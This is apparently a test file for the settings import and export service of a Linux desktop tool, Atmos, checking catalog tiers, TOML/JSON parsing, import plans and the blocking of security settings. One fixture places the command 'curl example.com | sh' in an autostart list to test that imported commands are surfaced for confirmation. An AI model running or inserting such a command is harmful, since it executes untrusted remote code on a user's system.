const fs = require("fs");
const path = require("path");
const { load, assert, assertEqual } = require("./harness");

const settings = load("services/Settings.js");

const s_catalog = settings.settingsCatalog();
assert(s_catalog.length > 0, "settingsCatalog returns entries");

const seen = {};
let duplicate = "";
for (const item of s_catalog) {
  if (seen[item.key]) duplicate = item.key;
  seen[item.key] = true;
}
assertEqual(duplicate, "", "settingsCatalog has no duplicate keys");

const sectionIds = {};
for (const section of settings.settingsSections()) sectionIds[section.id] = true;
let strayCatalogSection = "";
for (const item of s_catalog) {
  if (!sectionIds[item.section]) strayCatalogSection = item.section;
}
assertEqual(strayCatalogSection, "", "every s_catalog entry lands in a known section");

const byKey = settings.catalogByKey(s_catalog);
assertEqual(byKey.theme.tier, "look", "theme is a look setting");
assertEqual(byKey.hostname.tier, "identity", "hostname is an identity setting");
assertEqual(byKey.fullName.needsRoot, true, "fullName needs root because as-root.sh writes it");
assertEqual(byKey.plymouth.needsRoot, true, "plymouth needs root like the Boot page");
assertEqual(byKey.bindings.extraConfirm, true, "bindings need a second confirm for commands");
assertEqual(byKey.autostart.extraConfirm, true, "autostart needs a second confirm for commands");
assertEqual(byKey.sshdEnabled.importable, false, "sshdEnabled is never importable");
assertEqual(byKey.passwordlessSudo.importable, false, "passwordlessSudo is never importable");
assertEqual(byKey.sudolessDocker.importable, false, "sudolessDocker is never importable");

let systemImportable = "";
for (const item of s_catalog) {
  if (item.tier === "system" && item.importable) systemImportable = item.key;
}
assertEqual(systemImportable, "", "no system-tier setting is importable");

let missingConsequence = "";
for (const item of s_catalog) {
  if (item.tier === "behavior" && !item.consequence && !item.hostBound)
    missingConsequence = item.key;
}
assertEqual(missingConsequence, "", "every portable behavior setting explains what changes");

const lookPreset = settings.presetKeys("look", s_catalog);
assert(lookPreset.indexOf("theme") !== -1, "the look preset takes the theme");
assert(lookPreset.indexOf("browser") === -1, "the look preset leaves the browser alone");
assert(lookPreset.indexOf("hostname") === -1, "the look preset leaves the hostname alone");

const portablePreset = settings.presetKeys("portable", s_catalog);
assert(portablePreset.indexOf("browser") !== -1, "the portable preset takes the browser");
assert(portablePreset.indexOf("hostname") === -1, "the portable preset leaves the hostname alone");
assert(
  portablePreset.indexOf("hyprInput.sensitivity") === -1,
  "the portable preset drops device-tuned input",
);

const fullPreset = settings.presetKeys("full", s_catalog);
assert(fullPreset.indexOf("hostname") !== -1, "the full preset takes the hostname");
assert(fullPreset.indexOf("sshdEnabled") === -1, "even the full preset refuses security settings");

assertEqual(
  settings.readValue({ hyprLook: { gapsIn: 8 } }, "hyprLook.gapsIn"),
  8,
  "readValue walks a dotted key",
);
assertEqual(
  settings.readValue({}, "hyprLook.gapsIn"),
  undefined,
  "readValue survives a missing branch",
);

const s_snapshot = {
  hostname: "atlas",
  theme: "tokyo-night",
  themes: ["tokyo-night", "catppuccin"],
  font: "CaskaydiaMono Nerd Font",
  fonts: ["CaskaydiaMono Nerd Font"],
  browser: "firefox",
  barPosition: "top",
  idleLock: 300,
  stayAwake: false,
  hyprLook: { gapsIn: 4, activeOpacity: 1 },
  hyprInput: { naturalScroll: false, sensitivity: 0 },
  sshdEnabled: true,
  passwordlessSudo: true,
  timezone: "America/New_York",
  timezones: ["America/New_York", "Europe/Berlin"],
};

const exported = settings.exportMarkdown(s_snapshot, ["theme", "browser", "hyprLook.gapsIn"], {
  exported: "2026-09-03T00:00:00Z",
  hardware: "abc123",
});
assert(exported.indexOf("# Atmos settings") === 0, "exportMarkdown opens with a heading");
assert(exported.indexOf("```toml atmos:meta") !== -1, "exportMarkdown writes a meta block");
assert(exported.indexOf('theme = "tokyo-night"') !== -1, "exportMarkdown writes a selected string");
assert(exported.indexOf("hyprLook.gapsIn = 4") !== -1, "exportMarkdown writes a dotted key");
assert(exported.indexOf("barPosition") === -1, "exportMarkdown leaves out unselected keys");
assert(
  exported.indexOf("- SSH server: on") !== -1,
  "exportMarkdown reports security state as prose",
);
assert(
  exported.indexOf("sshdEnabled =") === -1,
  "exportMarkdown never puts a security setting in a block",
);

const round = settings.parseSettingsMarkdown(exported);
assertEqual(round.errors.length, 0, "a file Atmos wrote reads back without errors");
assertEqual(round.meta.schema, 1, "parseSettingsMarkdown reads the schema");
assertEqual(round.meta.hardware, "abc123", "parseSettingsMarkdown reads the hardware fingerprint");
assertEqual(round.sections.appearance.theme, "tokyo-night", "parseSettingsMarkdown reads a value");
assertEqual(
  round.sections.windows["hyprLook.gapsIn"],
  4,
  "parseSettingsMarkdown reads a dotted key",
);
assertEqual(round.sections.security, undefined, "the reported security prose is not a block");

const proseSafe = settings.parseSettingsMarkdown(
  '# Notes\n\nkey = "not in a block"\n\n```toml atmos:appearance\ntheme = "catppuccin"\n```\n',
);
assertEqual(
  proseSafe.sections.appearance.theme,
  "catppuccin",
  "parseSettingsMarkdown reads only fenced blocks",
);
assertEqual(Object.keys(proseSafe.sections).length, 1, "prose outside a block is ignored");

const unclosed = settings.parseSettingsMarkdown('```toml atmos:appearance\ntheme = "x"\n');
assert(unclosed.errors.length === 1, "an unclosed block is an error");

const badValues = settings.parseSettingsMarkdown(
  '```toml atmos:appearance\nnope\ntheme = \n1bad = "x"\n```\n',
);
assertEqual(badValues.errors.length, 3, "parseSettingsMarkdown reports each unreadable line");

assertEqual(settings.parseTomlValue("true"), true, "parseTomlValue reads a boolean");
assertEqual(settings.parseTomlValue("-12"), -12, "parseTomlValue reads a negative integer");
assertEqual(settings.parseTomlValue("0.5"), 0.5, "parseTomlValue reads a float");
assertEqual(
  settings.parseTomlValue('"a \\"b\\" c"'),
  'a "b" c',
  "parseTomlValue unescapes a quoted string",
);
assertEqual(settings.parseTomlValue("[]").length, 0, "parseTomlValue reads an empty list");
assertEqual(
  settings.parseTomlValue('["a", "b"]')[1],
  "b",
  "parseTomlValue reads a list of strings",
);
assertEqual(settings.parseTomlValue("bare"), undefined, "parseTomlValue refuses a bare word");

function planFor(body, keys, options) {
  return settings.planImport(settings.parseSettingsMarkdown(body), s_snapshot, keys, options);
}

const plan = planFor(
  "```toml atmos:meta\nschema = 1\n```\n" +
    '```toml atmos:appearance\ntheme = "catppuccin"\nfont = "CaskaydiaMono Nerd Font"\n```\n' +
    '```toml atmos:defaults\nbrowser = "brave"\n```\n',
);
assertEqual(plan.changes.length, 2, "planImport counts only real changes");
assertEqual(plan.unchanged.length, 1, "planImport reports a value that already matches");
assertEqual(plan.changes[0].key, "browser", "planImport sorts changes by key");
assertEqual(plan.changes[0].from, "firefox", "planImport records the current value");
assertEqual(plan.changes[0].to, "brave", "planImport records the incoming value");
assert(plan.changes[0].consequence.length > 0, "a behavior change carries its consequence");
assertEqual(plan.summary, "2 changes, 1 already match", "planImport summarises the plan");

const singular = planFor(
  "```toml atmos:meta\nschema = 1\n```\n" + '```toml atmos:appearance\ntheme = "catppuccin"\n```\n',
);
assertEqual(singular.summary, "1 change", 'planImport says "1 change" for one change');

const unknownTheme = planFor('```toml atmos:appearance\ntheme = "does-not-exist"\n```\n');
assertEqual(unknownTheme.changes.length, 0, "a theme this machine lacks is not a change");
assertEqual(unknownTheme.blocked.length, 1, "a theme this machine lacks is blocked");
assert(
  unknownTheme.blocked[0].reason.indexOf("not available on this machine") !== -1,
  "the block says the value is not available here",
);

const security = planFor(
  "```toml atmos:security\nsshdEnabled = true\npasswordlessSudo = true\n```\n",
);
assertEqual(security.changes.length, 0, "a security block produces no changes");
assertEqual(security.blocked.length, 2, "every security key is blocked");
assert(
  security.blocked[0].reason.indexOf("never imports security settings") !== -1,
  "the block says security settings are never imported",
);

const wrongType = planFor('```toml atmos:idle\nidleLock = "soon"\n```\n');
assertEqual(wrongType.blocked.length, 1, "a value of the wrong type is blocked");
assert(
  wrongType.blocked[0].reason.indexOf("expects integer") !== -1,
  "the block names the expected type",
);

const unknownKey = planFor('```toml atmos:appearance\nmadeUpSetting = "x"\n```\n');
assertEqual(unknownKey.warnings.length, 2, "an unknown key warns, alongside the missing schema");
assert(
  unknownKey.warnings[1].message.indexOf("does not know this setting") !== -1,
  "the warning says the setting is unknown",
);

const wrongSection = planFor('```toml atmos:appearance\nbrowser = "brave"\n```\n');
assertEqual(wrongSection.changes.length, 0, "a key in the wrong section is not applied");
assert(
  wrongSection.warnings[1].message.indexOf("belongs to defaults") !== -1,
  "the warning names the section the key belongs to",
);

const future = planFor(
  '```toml atmos:meta\nschema = 99\n```\n```toml atmos:appearance\ntheme = "catppuccin"\n```\n',
);
assertEqual(future.changes.length, 0, "a newer schema stops the plan");
assert(
  future.blocked[0].reason.indexOf("Update Atmos first") !== -1,
  "a newer schema asks you to update Atmos",
);

const otherMachine = planFor(
  '```toml atmos:meta\nschema = 1\nhardware = "aaa"\n```\n' +
    "```toml atmos:input\nhyprInput.naturalScroll = true\nhyprInput.sensitivity = 0.4\n```\n",
  null,
  { hardware: "bbb" },
);
assertEqual(
  otherMachine.changes.length,
  1,
  "a device-tuned setting is held back on other hardware",
);
assertEqual(
  otherMachine.changes[0].key,
  "hyprInput.naturalScroll",
  "a portable input setting still applies",
);
assertEqual(
  otherMachine.warnings.length,
  2,
  "different hardware warns once for the file and once for the setting",
);

const sameMachine = planFor(
  '```toml atmos:meta\nschema = 1\nhardware = "aaa"\n```\n' +
    "```toml atmos:input\nhyprInput.sensitivity = 0.4\n```\n",
  null,
  { hardware: "aaa" },
);
assertEqual(sameMachine.changes.length, 1, "the same hardware keeps device-tuned settings");

const selected = planFor(
  "```toml atmos:meta\nschema = 1\n```\n" +
    '```toml atmos:appearance\ntheme = "catppuccin"\n```\n' +
    '```toml atmos:defaults\nbrowser = "brave"\n```\n',
  ["theme"],
);
assertEqual(selected.changes.length, 1, "planImport honours a selection");
assertEqual(selected.changes[0].key, "theme", "the selection keeps only the chosen key");

const encoded = JSON.parse(settings.planToJson(plan));
assertEqual(encoded.schema, 1, "planToJson stamps the schema");
assertEqual(encoded.changes.length, 2, "planToJson carries every change");
assertEqual(encoded.changes[0].key, "browser", "planToJson keeps the plan order");

// The s_catalog lives in JS and the writers live in bash. Nothing stops those
// two from drifting apart except this check.
const applyScript = fs.readFileSync(
  path.join(__dirname, "..", "scripts/apply-settings.sh"),
  "utf8",
);
const dispatch = applyScript.slice(
  applyScript.indexOf("while IFS= read -r key; do"),
  applyScript.indexOf("done < <(jq -r "),
);
assert(dispatch.length > 0, "apply-settings.sh has a dispatch loop");

const labels = [];
for (const line of dispatch.split("\n")) {
  const match = line.match(/^ {4}(\S[^)(]*?)\)/);
  if (!match) continue;
  for (const part of match[1].split("|")) labels.push(part.trim());
}
assert(labels.indexOf("*") !== -1, "the dispatcher refuses an unknown key");

function dispatched(key) {
  if (labels.indexOf(key) !== -1) return true;
  for (const label of labels) {
    if (label.slice(-2) !== ".*") continue;
    if (key.indexOf(label.slice(0, -2) + ".") === 0) return true;
  }
  return false;
}

let undispatched = "";
for (const item of s_catalog) {
  if (item.importable && !dispatched(item.key)) undispatched = item.key;
}
assertEqual(undispatched, "", "every importable setting has a writer in apply-settings.sh");

let orphanLabel = "";
for (const label of labels) {
  if (label === "*") continue;
  const key = label.slice(-2) === ".*" ? label.slice(0, -2) + ".gapsIn" : label;
  if (!byKey[label] && !byKey[key] && label.indexOf(".*") === -1) orphanLabel = label;
}
assertEqual(orphanLabel, "", "apply-settings.sh has no writer for a setting the s_catalog dropped");

// Lists: whole-list settings carried in a json block named for the setting.
assertEqual(byKey.bindings.kind, "list", "bindings is a list setting");
assertEqual(byKey.bindings.section, "bindings", "a list setting is its own section");
assert(byKey.bindings.consequence.length > 0, "replacing your keybindings explains itself");
assertEqual(byKey.autostart.kind, "list", "autostart is a list setting");
assertEqual(byKey.windowRules.kind, "list", "windowRules is a list setting");

const listSnapshot = {
  bindings: [
    { keys: "SUPER + RETURN", label: "Terminal", command: "kitty", unbind: false, managed: true },
    { keys: "SUPER + J", label: "", command: "", unbind: true, managed: false },
  ],
  autostart: [{ command: "solaar --window=hide", managed: false }],
  windowRules: [],
};

const listMd = settings.exportMarkdown(listSnapshot, ["bindings", "autostart"], {
  hardware: "aaa",
});
assert(
  listMd.indexOf("```json atmos:bindings") !== -1,
  "exportMarkdown writes a json block for a list",
);
assert(listMd.indexOf("## Keybindings") !== -1, "a list setting gets its own heading");
assert(listMd.indexOf('"SUPER + RETURN"') !== -1, "the exported list keeps the binding");

const listBack = settings.parseSettingsMarkdown(listMd);
assertEqual(listBack.errors.length, 0, "a list file reads back without errors");
assertEqual(
  listBack.sections.bindings.bindings.length,
  2,
  "parseSettingsMarkdown reads the whole list",
);
assertEqual(
  listBack.sections.bindings.bindings[0].keys,
  "SUPER + RETURN",
  "parseSettingsMarkdown keeps row shape",
);

const listReplay = settings.planImport(listBack, listSnapshot, null, { hardware: "aaa" });
assertEqual(listReplay.changes.length, 0, "exporting a list and replaying it changes nothing");
assertEqual(listReplay.unchanged.length, 2, "both lists already match");

const listChanged = settings.planImport(
  settings.parseSettingsMarkdown(
    "```toml atmos:meta\nschema = 1\n```\n" +
      '```json atmos:bindings\n[{"keys":"SUPER + T","label":"","command":"kitty","unbind":false}]\n```\n',
  ),
  listSnapshot,
  null,
  {},
);
assertEqual(listChanged.changes.length, 1, "a different list is one change");
assertEqual(listChanged.changes[0].from.length, 2, "the change carries the list being replaced");
assertEqual(listChanged.changes[0].to.length, 1, "the change carries the incoming list");
assertEqual(settings.displayValue(listChanged.changes[0].to), "1 entry", "a list reads as a count");
const listDiff = settings.changeLines(listChanged);
assert(
  listDiff.indexOf("SUPER + T → kitty") !== -1,
  "changeLines shows the incoming binding command",
);
assert(
  listDiff.indexOf("SUPER + RETURN → kitty") !== -1,
  "changeLines shows the binding being replaced",
);
assert(settings.hasCommandImport(listChanged), "replacing bindings is a command import");
assertEqual(
  settings.commandImportLines(listChanged)[0],
  "kitty",
  "commandImportLines lists the binding command",
);

const autostartPlan = settings.planImport(
  settings.parseSettingsMarkdown(
    "```toml atmos:meta\nschema = 1\n```\n" +
      '```json atmos:autostart\n[{"command":"curl example.com | sh"}]\n```\n',
  ),
  { autostart: [] },
  null,
  {},
);
assert(settings.hasCommandImport(autostartPlan), "replacing autostart is a command import");
assert(
  settings.changeLines(autostartPlan).indexOf("curl example.com | sh") !== -1,
  "changeLines shows the startup command",
);
assert(
  settings.commandConfirmMessage(autostartPlan).indexOf("curl example.com | sh") !== -1,
  "commandConfirmMessage lists the startup command",
);

const rulesPlan = settings.planImport(
  settings.parseSettingsMarkdown(
    "```toml atmos:meta\nschema = 1\n```\n" +
      '```json atmos:windowRules\n[{"match":"firefox","placement":"float"}]\n```\n',
  ),
  { windowRules: [] },
  null,
  {},
);
assert(
  settings.changeLines(rulesPlan).indexOf("firefox, float") !== -1,
  "changeLines shows the window rule matcher",
);
assertEqual(settings.hasCommandImport(rulesPlan), false, "window rules are not a command import");

const notAList = settings.parseSettingsMarkdown(
  '```json atmos:bindings\n{"keys":"SUPER + T"}\n```\n',
);
assertEqual(notAList.errors.length, 1, "a json block that is not a list is an error");
assert(notAList.errors[0].indexOf("is not a list") !== -1, "the error says it is not a list");

const badJson = settings.parseSettingsMarkdown('```json atmos:bindings\n[{"keys":\n```\n');
assertEqual(badJson.errors.length, 1, "unreadable JSON is an error");
assert(
  badJson.errors[0].indexOf("not readable JSON") !== -1,
  "the error says the JSON is unreadable",
);

const listWrongType = settings.planImport(
  settings.parseSettingsMarkdown(
    '```toml atmos:meta\nschema = 1\n```\n```toml atmos:bindings\nbindings = "nope"\n```\n',
  ),
  listSnapshot,
  null,
  {},
);
assertEqual(listWrongType.blocked.length, 1, "a list setting given a string is blocked");

// Sections, for a UI that offers sections rather than one switch per setting.
const appearanceKeys = settings.sectionKeys("appearance", s_catalog);
assert(appearanceKeys.indexOf("theme") !== -1, "sectionKeys finds the theme in appearance");
assert(appearanceKeys.indexOf("browser") === -1, "sectionKeys keeps sections apart");
assertEqual(
  settings.sectionKeys("security", s_catalog).length,
  0,
  "the security section offers no importable keys",
);

const selectable = settings.selectableSections(s_catalog);
let securityOffered = false;
let emptyOffered = "";
for (const section of selectable) {
  if (section.id === "security") securityOffered = true;
  if (section.count === 0) emptyOffered = section.id;
}
assertEqual(securityOffered, false, "the security section is never offered as a switch");
assertEqual(emptyOffered, "", "no empty section is offered");
assert(selectable.length >= 8, "every section holding settings is offered");

let identityDefault = true;
let appearanceDefault = false;
for (const section of selectable) {
  if (section.id === "system") identityDefault = section.byDefault;
  if (section.id === "appearance") appearanceDefault = section.byDefault;
}
assertEqual(identityDefault, false, "machine identity starts switched off");
assertEqual(appearanceDefault, true, "appearance starts switched on");

const twoSections = settings.keysForSections(["appearance", "defaults"], s_catalog);
assert(twoSections.indexOf("theme") !== -1, "keysForSections takes the first section");
assert(twoSections.indexOf("browser") !== -1, "keysForSections takes the second section");
assert(twoSections.indexOf("hostname") === -1, "keysForSections leaves out what was not asked for");
assertEqual(settings.keysForSections([], s_catalog).length, 0, "no sections means no keys");

let sectionTotal = 0;
for (const section of selectable) sectionTotal += section.count;
assertEqual(
  sectionTotal,
  settings.presetKeys("full", s_catalog).length,
  "the sections between them cover every importable setting",
);

// A sentinel writer leaves hand-written rows where they are, so importing a
// list Atmos does not already own leaves two copies in the file.
const handWritten = {
  bindings: [
    { keys: "SUPER + D", label: "Desks", command: "desk", unbind: false, managed: false },
    { keys: "SUPER + B", label: "Brave", command: "brave", unbind: false, managed: false },
  ],
};
const shadowPlan = settings.planImport(
  settings.parseSettingsMarkdown(
    "```toml atmos:meta\nschema = 1\n```\n" +
      '```json atmos:bindings\n[{"keys":"SUPER + T","label":"","command":"kitty","unbind":false}]\n```\n',
  ),
  handWritten,
  null,
  {},
);
assertEqual(shadowPlan.changes.length, 1, "replacing hand-written bindings is still one change");
assertEqual(shadowPlan.warnings.length, 1, "replacing hand-written bindings warns");
assert(
  shadowPlan.warnings[0].message.indexOf("2 rows") === 0,
  "the warning counts the hand-written rows",
);
assert(
  shadowPlan.warnings[0].message.indexOf("written by hand") !== -1,
  "the warning says the rows are hand-written",
);

const alreadyManaged = settings.planImport(
  settings.parseSettingsMarkdown(
    "```toml atmos:meta\nschema = 1\n```\n" +
      '```json atmos:bindings\n[{"keys":"SUPER + T","label":"","command":"kitty","unbind":false}]\n```\n',
  ),
  { bindings: [{ keys: "SUPER + D", label: "", command: "desk", unbind: false, managed: true }] },
  null,
  {},
);
assertEqual(alreadyManaged.warnings.length, 0, "rows Atmos already owns need no warning");

// Plan rendering lives in the service so the wording stays under test.
const renderPlan = settings.planImport(
  settings.parseSettingsMarkdown(
    "```toml atmos:meta\nschema = 1\n```\n" +
      '```toml atmos:defaults\nbrowser = "brave"\n```\n' +
      "```toml atmos:security\nsshdEnabled = true\n```\n",
  ),
  { browser: "firefox", sshdEnabled: false },
  null,
  {},
);
const changeText = settings.changeLines(renderPlan);
assert(changeText.indexOf("• Browser: firefox → brave") === 0, "changeLines reads as a sentence");
assert(
  changeText.indexOf("\n    Every link") !== -1,
  "changeLines indents the consequence under the change",
);
assert(settings.blockedLines(renderPlan).indexOf("• ") === 0, "blockedLines bullets each refusal");
assertEqual(settings.changeLines(null), "", "changeLines survives no plan");
assertEqual(settings.warningLines(null), "", "warningLines survives no plan");
assertEqual(settings.blockedLines(null), "", "blockedLines survives no plan");

assertEqual(settings.shownValue(""), "not set", "an empty value reads as not set");
assertEqual(settings.shownValue(null), "not set", "a missing value reads as not set");
assertEqual(settings.shownValue(false), "off", "false reads as off, not as missing");
assertEqual(settings.shownValue(0), "0", "zero reads as zero, not as missing");

// PrefsRow's control slot takes its size from children[0], so a second
// direct child is drawn on top of the first. Wrap them in a Row instead.
function overlappingControlRows() {
  const found = [];
  const dirs = ["pages", "components"];
  for (const dir of dirs) {
    const full = path.join(__dirname, "..", dir);
    for (const name of fs.readdirSync(full)) {
      if (!name.endsWith(".qml")) continue;
      const lines = fs.readFileSync(path.join(full, name), "utf8").split("\n");
      for (let i = 0; i < lines.length; i++) {
        if (!/^\s*PrefsRow\s*\{/.test(lines[i])) continue;
        const base = lines[i].length - lines[i].trimStart().length;
        let depth = 1;
        const kids = [];
        for (let j = i + 1; j < lines.length && depth > 0; j++) {
          const line = lines[j];
          const indent = line.length - line.trimStart().length;
          const child = line.match(/^\s*([A-Z][A-Za-z0-9_]*)\s*\{/);
          if (child && depth === 1 && indent === base + 2) kids.push(child[1]);
          depth += line.split("{").length - 1 - (line.split("}").length - 1);
        }
        if (kids.length > 1) found.push(`${dir}/${name}:${i + 1} (${kids.join(", ")})`);
      }
    }
  }
  return found;
}

const overlapping = overlappingControlRows();
assertEqual(overlapping.join(" "), "", "no PrefsRow stacks two controls on top of each other");

// An exported file should say what it is, where it came from, and when.
const when = new Date(2026, 8, 3, 19, 30);
assertEqual(
  settings.exportFileName("vic", when),
  "atmos-export-vic-2026-09-03-1930.md",
  "exportFileName names the machine and the moment",
);
assertEqual(
  settings.exportFileName("Fred's Laptop!", when),
  "atmos-export-fred-s-laptop-2026-09-03-1930.md",
  "exportFileName makes an awkward hostname into a filename",
);
assertEqual(
  settings.exportFileName("", when),
  "atmos-export-2026-09-03-1930.md",
  "exportFileName drops the host when there is not one",
);
assertEqual(
  settings.exportFileName("---", when),
  "atmos-export-2026-09-03-1930.md",
  "a hostname of only punctuation leaves no stray dashes",
);
assertEqual(
  settings.exportFileName("vic", new Date(2026, 0, 7, 4, 5)),
  "atmos-export-vic-2026-01-07-0405.md",
  "exportFileName pads single digits so the names sort",
);
assert(
  /^atmos-export-vic-\d{4}-\d{2}-\d{2}-\d{4}\.md$/.test(settings.exportFileName("vic", null)),
  "exportFileName falls back to now when given no date",
);
assert(
  /^atmos-export-vic-\d{4}/.test(settings.exportFileName("vic", new Date("nonsense"))),
  "exportFileName survives an unusable date",
);
assertEqual(settings.fileSafe("a".repeat(80)).length, 40, "a very long hostname is trimmed");

// A machine that cannot list its own options should not have every value
// refused, but the check looking exact when it was never made is worse.
const cannotCheck = settings.planImport(
  settings.parseSettingsMarkdown(
    "```toml atmos:meta\nschema = 1\n```\n" +
      '```toml atmos:appearance\ntheme = "anything-at-all"\n```\n',
  ),
  { theme: "Unknown", themes: [] },
  null,
  {},
);
assertEqual(cannotCheck.blocked.length, 0, "an unlistable option is not blocked outright");
assertEqual(cannotCheck.changes.length, 1, "an unlistable option still plans the change");
assertEqual(cannotCheck.warnings.length, 1, "an unlistable option warns that it was not checked");
assert(
  cannotCheck.warnings[0].message.indexOf("could not be checked") !== -1,
  "the warning says the value was not checked",
);

// A plan says what would change. This says what you are about to trust.
const provenance = settings.parseSettingsMarkdown(
  '```toml atmos:meta\nschema = 1\nhostname = "vic"\nexported = "2026-09-03T20:06:11.000Z"\nhardware = "Victus by HP"\n```\n' +
    '```toml atmos:appearance\ntheme = "catppuccin"\n```\n' +
    '```toml atmos:defaults\nbrowser = "brave"\n```\n',
);
const provPlan = settings.planImport(
  provenance,
  { theme: "catppuccin", browser: "firefox" },
  null,
  {},
);
const summaryText = settings.fileSummary(provenance, provPlan);
assert(summaryText.indexOf("From vic") !== -1, "fileSummary names the machine it came from");
assert(
  summaryText.indexOf("2026-09-03 20:06:11") !== -1,
  "fileSummary reads the export time plainly",
);
assert(summaryText.indexOf("Victus by HP") !== -1, "fileSummary names the hardware");
assert(
  summaryText.indexOf("2 sections: appearance, defaults") !== -1,
  "fileSummary lists the sections",
);
assert(
  summaryText.indexOf("1 of these already match") !== -1,
  "fileSummary counts what already matches",
);

const anonymous = settings.parseSettingsMarkdown('```toml atmos:appearance\ntheme = "x"\n```\n');
const anonText = settings.fileSummary(anonymous, null);
assert(
  anonText.indexOf("1 section: appearance") !== -1,
  "fileSummary still describes a file with no meta",
);
assertEqual(settings.fileSummary(null, null), "", "fileSummary survives no document");
// A value the machine already holds needs no permission to stay. Plymouth
// reports "default" as its theme while the installable themes list does not
// contain it, so validating before comparing refused the machine its own
// setting and every export of that machine came back with one blocked row.
const holdsOwnValue = settings.planImport(
  settings.parseSettingsMarkdown(
    "```toml atmos:meta\nschema = 1\n```\n" +
      '```toml atmos:appearance\nplymouth = "default"\n```\n',
  ),
  { plymouth: "default", plymouthThemes: ["catppuccin", "everforest"] },
  null,
  {},
);
assertEqual(holdsOwnValue.blocked.length, 0, "a value the machine already holds is never blocked");
assertEqual(holdsOwnValue.unchanged.length, 1, "a value the machine already holds is unchanged");

// Changing to something genuinely absent is still refused.
const wantsMissing = settings.planImport(
  settings.parseSettingsMarkdown(
    "```toml atmos:meta\nschema = 1\n```\n" +
      '```toml atmos:appearance\nplymouth = "not-installed"\n```\n',
  ),
  { plymouth: "default", plymouthThemes: ["catppuccin", "everforest"] },
  null,
  {},
);
assertEqual(wantsMissing.blocked.length, 1, "a value the machine does not have is still blocked");

// Before pressing apply: how much, and whether it will interrupt you.
const rootPlan = settings.planImport(
  settings.parseSettingsMarkdown(
    "```toml atmos:meta\nschema = 1\n```\n" +
      '```toml atmos:system\nhostname = "elsewhere"\ntimezone = "Europe/Berlin"\n```\n' +
      '```toml atmos:defaults\nbrowser = "brave"\n```\n',
  ),
  {
    hostname: "vic",
    timezone: "America/New_York",
    timezones: ["Europe/Berlin"],
    browser: "firefox",
  },
  null,
  {},
);
assertEqual(rootPlan.changes.length, 3, "three changes planned");
assertEqual(settings.passwordCount(rootPlan), 2, "two of them raise privileges");
const forecast = settings.applyForecast(rootPlan);
assert(forecast.indexOf("3 changes") === 0, "the forecast leads with the count");
assert(forecast.indexOf("2 changes need root") !== -1, "the forecast counts what needs root");
assert(
  forecast.indexOf("asks for sudo mode once") !== -1,
  "the forecast says Atmos asks once rather than per change",
);

const quietPlan = settings.planImport(
  settings.parseSettingsMarkdown(
    '```toml atmos:meta\nschema = 1\n```\n```toml atmos:defaults\nbrowser = "brave"\n```\n',
  ),
  { browser: "firefox" },
  null,
  {},
);
assertEqual(settings.passwordCount(quietPlan), 0, "a cosmetic plan asks for nothing");
assert(
  settings.applyForecast(quietPlan).indexOf("password") === -1,
  "a plan that needs no password does not mention one",
);
assertEqual(settings.applyForecast({ changes: [] }), "", "no changes, no forecast");

const applyJson =
  "progress\t1\t2\ttheme\n" +
  '{"backup":"/tmp/imports/one","results":[{"key":"theme","status":"applied"},{"key":"font","status":"failed"}]}';
const applyResult = settings.parseApplyResult(applyJson);
assertEqual(applyResult.backup, "/tmp/imports/one", "parseApplyResult reads the backup path");
assertEqual(
  settings.appliedCountFromResult(applyResult),
  1,
  "appliedCountFromResult skips failures",
);
assertEqual(
  settings.backupDirFromResult(applyResult),
  "/tmp/imports/one",
  "backupDirFromResult reads backup",
);
assertEqual(
  settings.parseApplyResult("progress\t1\t1\ttheme").backup,
  "",
  "parseApplyResult survives no JSON",
);
